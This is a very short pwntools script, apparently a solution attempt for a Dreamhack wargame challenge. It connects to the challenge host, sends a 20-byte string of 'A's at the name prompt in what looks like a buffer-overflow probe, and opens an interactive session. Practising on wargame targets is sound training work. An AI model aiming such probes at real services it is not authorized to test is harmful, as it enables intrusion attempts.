from pwn import *

port = 22594
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b"Name: ", b"A" * 20)

rem.interactive()